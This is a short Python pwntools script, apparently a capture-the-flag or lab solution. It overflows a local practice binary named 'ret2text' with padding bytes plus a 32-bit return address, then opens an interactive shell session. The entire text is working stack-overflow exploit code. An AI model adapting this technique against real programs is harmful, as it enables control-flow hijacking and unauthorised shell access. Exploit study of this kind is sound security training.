from pwn import *  

sh = process('./ret2text')

addr = 0x804863a

sh.sendline(b'A' * (0x6c + 4) + p32(addr))
sh.interactive()
